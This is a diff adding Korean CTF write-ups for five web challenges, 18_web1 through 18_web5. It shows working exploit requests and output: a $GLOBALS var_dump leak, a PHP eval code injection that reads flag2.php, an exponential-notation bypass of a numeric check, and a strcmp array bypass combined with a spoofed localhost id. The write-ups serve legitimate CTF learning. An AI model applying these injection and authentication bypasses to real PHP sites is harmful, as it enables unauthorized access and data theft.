@@ -381,10 +381,183 @@ FLAG: LFI_WITH_BASE64_IS_VERY_DANGEROUS_!
 ```
 
 ### 18_web1 (50pt)
+
+![](img/18_web1.png)
+
+참 고맙게도 `var_dump` 한 값을 보여준다. 그러면 아무 힌트도 없지만, 공주대 CTF 당시에는 대회 전 힌트에서 `$GLOBALS` 힌트를 주었으니 그걸로 풀면 된다.
+
+```
+http://wargame_sec.kongju.ac.kr/web/18_web1/index.php?args=GLOBALS
+```
+
+![](img/18_web1-2.png)
+
+```
+FLAG: B0sSBaby!
+```
+
 ### 18_web2 (100pt)
+
+닫혀있다. 근데도 라업은 올릴거다.
+
+![](img/18_web2.png)
+
+개꿀 아님미까...?
+
+`$_REQUEST`는 POST로 보낼때 폼 데이터를 가지고 있다.
+
+아마 `$flag`에 플래그가 담겨져 있을테니 그렇게 해보자.
+```
+Python 3.7.0 (v3.7.0:1bf9cc5093, Jun 27 2018, 04:06:47) [MSC v.1914 32 bit (Intel)] on win32
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import requests
+>>> response = requests.post('http://sec.kongju.ac.kr/ctf/comme/', data={'hello': '$flag'})
+>>> response.text
+'<code><span style="color: #000000">\n<span style="color: #0000BB">&lt;?php&nbsp;<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">"flag2.php"</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">error_reporting</span><span style="color: #007700">(</span><span style="color: #0000BB">0</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">show_source</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$a&nbsp;</span><span style="color: #007700">=&nbsp;@</span><span style="color: #0000BB">$_REQUEST</span><span style="color: #007700">[</span><span style="color: #DD0000">\'hello\'</span><span style="color: #007700">];<br />eval(</span><span style="color: #DD0000">"var_dump(</span><span style="color: #0000BB">$a</span><span style="color: #DD0000">);"</span><span style="color: #007700">);<br /></span>\n</span>\n</code>string(14) "flag not here!"\n'
+>>>
+```
+플래그는 여기에 없나보다. 그럼 수상한 flag2.php를 들여다 보자.
+
+```
+>>> response = requests.post('http://sec.kongju.ac.kr/ctf/comme/', data={'hello': 'file_get_contents(\'flag2.php\')'})
+>>> response.text
+'<code><span style="color: #000000">\n<span style="color: #0000BB">&lt;?php&nbsp;<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">"flag2.php"</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">error_reporting</span><span style="color: #007700">(</span><span style="color: #0000BB">0</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">show_source</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$a&nbsp;</span><span style="color: #007700">=&nbsp;@</span><span style="color: #0000BB">$_REQUEST</span><span style="color: #007700">[</span><span style="color: #DD0000">\'hello\'</span><span style="color: #007700">];<br />eval(</span><span style="color: #DD0000">"var_dump(</span><span style="color: #0000BB">$a</span><span style="color: #DD0000">);"</span><span style="color: #007700">);<br /></span>\n</span>\n</code>string(62) "<?php \n$flag ="flag not here!";\n\n// flag : C0mmeDesGarcons!;\n "\n'
+>>>
+```
+
+```
+FLAG: C0mmeDesGarcons!
+```
+
+지금은 작동하지 않을테지만 리모트쉘 처럼 될 수 있어서 막힌거다.
+
+하는 방법은 안 알려줄거다.
+
 ### 18_web3 (100pt)
+
+![](img/18_web3.png)
+
+그때 어떻게 풀었는지는 기억 안나는데 지금 보니까 그냥 Guess! 버튼 누르니까 되더라..
+
+![](img/18_web3-2.png)
+
+```
+FLAG: danbi!
+```
+
 ### 18_web4 (100pt)
+
+![](img/18_web4.png)
+
+#### 소스코드
+```php
+<!DOCTYPE html>
+<html>
+<head>
+    <title>level2</title>
+    <link href='style.css' rel='stylesheet' type='text/css'>
+</head>
+<body>
+    <?php
+    require 'flag.php';
+
+    if (isset($_GET['password'])) {
+        if (is_numeric($_GET['password'])) {
+            if (strlen($_GET['password']) < 4) {
+                if ($_GET['password'] > 999) die('Flag: ' . $flag);
+                else print '<p class="alert">Too little</p>';
+            }
+            else print '<p class="alert">Too long</p>';
+        }
+        else print '<p class="alert">Password is not numeric</p>';
+    }
+    ?>
+    <section class="login">
+        <div class="title">
+            <a href="./index.txt">Level 2</a>
+        </div>
+        <form method="get">
+            <input name="password" placeholder="Password" required="" type="text"><br>
+            <input type="submit">
+        </form>
+    </section>
+</body>
+</html>
+```
+
+999를 넘겨야 하지만 4글자를 넘기면 안된다. 라는 조건이 있다.
+
+이 경우에는 Exponential Notation(지수 표기법)을 사용하면 된다.
+3글자 안에서 만들수 있는 가장 큰수는 `9e9` 이니, 이걸 입력하면 된다.
+
+![](img/18_web4-2.png)
+
+```
+FLAG: yeeZY_BOost
+```
+
 ### 18_web5 (200pt)
+
+![](img/18_web5.png)
+
+로그인 창에 들어가보면 ID가 본인의 IP로 되어있고, PS는 비어져 있다. 소스도 같이 제공되는데 로그인을 처리하는 소스를 보자.
+
+```php
+<?php
+    include("./otp_util.php");
+    $flag = file_get_contents($flag_file);
+
+    if (isset($_POST["id"]) && isset($_POST["ps"])) {
+        $password = make_otp($_POST["id"]);
+        sleep(3); // do not bruteforce
+
+        if (strcmp($password, $_POST["ps"]) == 0) {
+            echo "welcome, <b>".$_POST["id"]."</b><br />";
+            echo "<input type='button' value='back' onclick='history.back();' />";
+
+            if ($_POST["id"] == "127.0.0.1") {
+                echo "<hr /><b>".$flag."</b><br />";
+            }
+        } else {
+            echo "<script>alert('login failed..');history.back();</script>";
+        }
+    }
+?>
+```
+
+일단 `strcmp`로 `ps`를 비교하니까 필드값을 `ps[]`로 고치면 되겠고, 딱히 `id`도 IP 검사를 안하니까 readonly더라도 소스를 고쳐서 Request 보내면 되겠다.
+
+크롬 개발자 도구로 소스를 고친다.
+
+```html
+<!-- 중략 -->
+<form method="post" action="./page/login_ok.php">
+	ID : <input type="text" name="id" value="XXX.XXX.XXX.XXX" readonly=""><br>
+	PS : <input type="password" name="ps"><br>
+	<input type="submit" value="login">
+</form>
+<!-- 중략 -->
+```
+
+다음과 같이 고친다.
+
+```html
+<!-- 중략 -->
+<form method="post" action="./page/login_ok.php">
+	ID : <input type="text" name="id" value="127.0.0.1" readonly=""><br>
+	PS : <input type="password" name="ps[]"><br>
+	<input type="submit" value="login">
+</form>
+<!-- 중략 -->
+```
+
+그리고 나서 요청을 보내면 된다.
+
+![](img/18_web5-2.png)
+
+```
+FLAG: Brann@@@@U_Web
+```
 
 ## Forensic
 ### ForensicPower (150pt)
